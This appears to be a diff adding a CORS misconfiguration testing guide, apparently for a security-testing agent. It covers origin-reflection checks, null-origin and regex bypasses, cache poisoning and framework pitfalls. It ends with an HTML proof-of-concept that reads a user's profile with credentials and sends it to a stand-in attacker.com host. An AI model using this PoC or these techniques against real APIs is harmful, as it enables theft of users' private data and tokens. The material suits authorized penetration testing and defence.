@@ -1,0 +1,251 @@
+<cors_misconfiguration_vulnerability_guide>
+<title>CORS MISCONFIGURATION</title>
+
+<critical>CORS misconfigurations allow malicious websites to read authenticated responses from vulnerable APIs. Unlike CSRF (which forces actions), CORS attacks exfiltrate data. The combination of Access-Control-Allow-Origin with Access-Control-Allow-Credentials: true is the critical vulnerability pattern.</critical>
+
+<scope>
+- REST APIs returning Access-Control-Allow-Origin headers
+- APIs with Access-Control-Allow-Credentials: true
+- GraphQL endpoints with cross-origin access
+- Single-page applications with separate API domains
+- Mobile app backends with browser-accessible endpoints
+- Internal APIs accidentally exposed to the internet
+</scope>
+
+<methodology>
+1. Identify all endpoints returning CORS headers (Access-Control-Allow-Origin)
+2. Test Origin header reflection by sending arbitrary origins
+3. Check for credentials support (Access-Control-Allow-Credentials: true)
+4. Probe null origin acceptance and subdomain wildcards
+5. Verify sensitive data is returned in responses
+6. Build proof-of-concept demonstrating cross-origin data theft
+</methodology>
+
+<high_value_targets>
+- User profile and account information endpoints
+- API key and secret management endpoints
+- Financial data and transaction history
+- Private messages and communications
+- OAuth tokens and session information
+- Admin and internal API endpoints
+- GraphQL introspection and queries
+</high_value_targets>
+
+<discovery_techniques>
+<origin_reflection>
+- Send arbitrary Origin: https://evil.com and check if reflected in Access-Control-Allow-Origin
+- Test with Origin: null (sandboxed iframes, data: URLs produce this)
+- Try protocol variations: http:// vs https:// for same domain
+- Test subdomain reflection: Origin: https://anything.target.com
+</origin_reflection>
+
+<credentials_check>
+- Look for Access-Control-Allow-Credentials: true in responses
+- Without credentials, attack limited to public data only
+- With credentials, attacker can read authenticated user's data
+</credentials_check>
+
+<wildcard_analysis>
+- Access-Control-Allow-Origin: * cannot be combined with credentials (browsers block it)
+- But reflection to specific origins with credentials is the vulnerability
+- Some servers incorrectly implement wildcards with credentials
+</wildcard_analysis>
+
+<preflight_behavior>
+- OPTIONS requests may have different CORS policies than actual requests
+- Test non-simple methods (PUT, DELETE) and custom headers
+- Some protections only apply to preflight, not simple requests
+</preflight_behavior>
+</discovery_techniques>
+
+<exploitation_techniques>
+<basic_data_theft>
+- Host malicious page that makes fetch() to vulnerable API
+- Response readable if CORS allows attacker's origin with credentials
+- Extract and exfiltrate data to attacker-controlled server
+</basic_data_theft>
+
+<origin_injection_patterns>
+Pattern 1 - Direct reflection:
+  Origin: https://evil.com → Access-Control-Allow-Origin: https://evil.com
+
+Pattern 2 - Null origin:
+  Origin: null → Access-Control-Allow-Origin: null
+
+Pattern 3 - Subdomain wildcard:
+  Origin: https://evil.target.com → Access-Control-Allow-Origin: https://evil.target.com
+
+Pattern 4 - Prefix/suffix matching:
+  Origin: https://target.com.evil.com → Access-Control-Allow-Origin: https://target.com.evil.com
+  Origin: https://eviltarget.com → Access-Control-Allow-Origin: https://eviltarget.com
+
+Pattern 5 - Protocol downgrade:
+  Origin: http://target.com → Access-Control-Allow-Origin: http://target.com (with https API)
+</origin_injection_patterns>
+
+<null_origin_exploitation>
+- Sandboxed iframe: &lt;iframe sandbox="allow-scripts" src="data:text/html,..."&gt;
+- data: URLs: data:text/html,&lt;script&gt;fetch(...)&lt;/script&gt;
+- file:// protocol in some browsers
+- Redirects from certain URL schemes
+</null_origin_exploitation>
+
+<subdomain_takeover_chain>
+- If *.target.com is allowed, find takeover-able subdomain
+- Claim abandoned subdomain (dangling DNS, expired cloud resources)
+- Host exploit on subdomain to bypass CORS
+</subdomain_takeover_chain>
+</exploitation_techniques>
+
+<advanced_techniques>
+<vary_header_analysis>
+- Check for Vary: Origin header (proper cache handling)
+- Missing Vary header may allow cache poisoning
+- CDN/proxy caching of CORS responses can extend attack surface
+</vary_header_analysis>
+
+<cors_cache_poisoning>
+- If responses cached without Vary: Origin, poison cache with attacker origin
+- Subsequent users receive cached response with attacker's CORS headers
+- Particularly dangerous with CDNs and reverse proxies
+</cors_cache_poisoning>
+
+<preflight_cache_exploitation>
+- Access-Control-Max-Age caches preflight responses
+- If preflight is cached with permissive CORS, subsequent requests bypass checks
+- Test with long max-age values and observe caching behavior
+</preflight_cache_exploitation>
+
+<method_header_exposure>
+- Access-Control-Expose-Headers reveals additional response headers
+- May leak sensitive headers: X-Request-Id, X-User-Id, custom auth headers
+- Access-Control-Allow-Headers on preflight shows accepted headers
+</method_header_exposure>
+
+<graphql_cors>
+- Introspection queries often have lax CORS
+- Mutation execution with stolen credentials
+- Batched queries for efficient data extraction
+</graphql_cors>
+</advanced_techniques>
+
+<bypass_techniques>
+<regex_flaws>
+- Dot not escaped: target.com matches targetXcom
+- Missing anchor: ^target.com matches evil-target.com
+- Missing end anchor: target.com$ matches target.com.evil.com
+- Case sensitivity: Target.com vs target.com
+</regex_flaws>
+
+<parsing_differences>
+- Browser vs server Origin parsing discrepancies
+- Ports in origin: https://target.com:443 vs https://target.com
+- Trailing slashes and path components
+- Unicode/punycode domain variations
+</parsing_differences>
+
+<special_origins>
+- chrome-extension:// origins (if whitelisted)
+- moz-extension:// for Firefox
+- Electron app:// origins
+- Custom URI schemes registered by apps
+</special_origins>
+
+<request_smuggling>
+- HTTP request smuggling to bypass CORS preflight
+- Cache desync attacks affecting CORS responses
+- Multiple Host headers confusing origin validation
+</request_smuggling>
+</bypass_techniques>
+
+<framework_specific>
+<express_cors>
+- cors() middleware with origin callback vulnerabilities
+- Dynamic origin validation using untrusted input
+- Misconfigured credentials: true with wildcard
+</express_cors>
+
+<flask_cors>
+- Flask-CORS with supports_credentials and regex origins
+- Prefix matching instead of exact matching
+- CORS_ORIGINS misconfiguration
+</flask_cors>
+
+<spring_cors>
+- @CrossOrigin annotation with allowedOrigins patterns
+- CorsConfiguration with regex pattern matching
+- Global CORS configuration in WebMvcConfigurer
+</spring_cors>
+
+<django_cors>
+- django-cors-headers with CORS_ALLOWED_ORIGIN_REGEXES
+- CORS_ALLOW_ALL_ORIGINS with CORS_ALLOW_CREDENTIALS
+- CORS_ALLOWED_ORIGINS list bypasses
+</django_cors>
+
+<nginx_cors>
+- add_header with $http_origin reflection
+- if statements with regex matching
+- Missing Vary: Origin header
+</nginx_cors>
+</framework_specific>
+
+<poc_template>
+```html
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;CORS PoC&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;script&gt;
+fetch('https://vulnerable-api.com/api/user/profile', {
+  credentials: 'include'
+})
+.then(response =&gt; response.json())
+.then(data =&gt; {
+  // Exfiltrate to attacker server
+  fetch('https://attacker.com/log?data=' + encodeURIComponent(JSON.stringify(data)));
+  document.body.innerHTML = '&lt;pre&gt;' + JSON.stringify(data, null, 2) + '&lt;/pre&gt;';
+});
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+```
+</poc_template>
+
+<validation>
+1. Confirm Access-Control-Allow-Origin reflects attacker-controlled origin
+2. Verify Access-Control-Allow-Credentials: true is present
+3. Show sensitive data returned in the response body
+4. Demonstrate working PoC hosted on attacker domain reading user data
+5. Test across different browsers (Chrome, Firefox, Safari have subtle differences)
+</validation>
+
+<false_positives>
+- Wildcard (*) without credentials (public data only, not exploitable for auth'd data)
+- CORS headers on truly public endpoints with no sensitive data
+- Origin allowlist properly implemented with exact matching
+- Responses contain only non-sensitive, intentionally public information
+</false_positives>
+
+<impact>
+- Theft of user personal information and private data
+- API key and credential exposure
+- Session hijacking via token theft
+- Financial data exfiltration
+- Compliance violations (GDPR, HIPAA, PCI-DSS)
+- Chain with XSS for same-origin attacks when CORS alone insufficient
+</impact>
+
+<pro_tips>
+1. Always test with credentials: 'include' - that's where the real vulnerability lies.
+2. Check both GET and POST endpoints; CORS policies may differ.
+3. Look for null origin acceptance - it's a common misconfiguration.
+4. Test subdomain patterns; wildcards like *.example.com are often implemented poorly.
+5. Combine with subdomain takeover for devastating chains.
+6. Cache poisoning via CORS can affect all users, not just those who visit attacker page.
+7. Internal APIs exposed to internet are often completely misconfigured.
+</pro_tips>
+
+<remember>CORS exploitation requires three conditions: origin reflection, credentials support, and sensitive data in response. Without all three, the vulnerability exists but may not be exploitable. Focus on authenticated API endpoints with valuable data.</remember>
+</cors_misconfiguration_vulnerability_guide>
+
